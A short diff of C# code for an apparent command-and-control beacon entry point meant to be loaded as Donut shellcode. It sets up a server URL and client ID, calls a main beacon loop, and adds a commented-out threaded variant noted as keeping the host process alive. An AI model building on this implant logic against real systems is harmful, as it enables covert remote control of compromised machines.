@@ -9,12 +9,36 @@ public class Runner
     // Точка входа для Donut
     public static void Start(string args)
     {
+        // NO THREAD
+        
         // Все переменные и объекты объявляются локально
         string serverUrl = "http://localhost:5000";
         string clientId = Guid.NewGuid().ToString().Substring(0, 8);
 
         // Основной цикл работы
         MainLoop(serverUrl, clientId);
+        
+
+        // WITH THREAD (INSTA UNLOADED OR FREEZED WHILE SLEEP)
+        /*
+        Thread beaconThread = new Thread(() =>
+        {
+            try
+            {
+                string serverUrl = "http://localhost:5000";
+                string clientId = Guid.NewGuid().ToString().Substring(0, 8);
+                MainLoop(serverUrl, clientId);
+            }
+            catch { }
+        });
+
+        // CRITICAL: Set to false. 
+        // Foreground threads prevent the .NET runtime from shutting down.
+        beaconThread.IsBackground = false;
+
+        beaconThread.Start();
+        Delay(10000); // Testing: Wait for the thread to do some work before exiting main thread
+        */
     }
 
     private static void MainLoop(string serverUrl, string clientId)
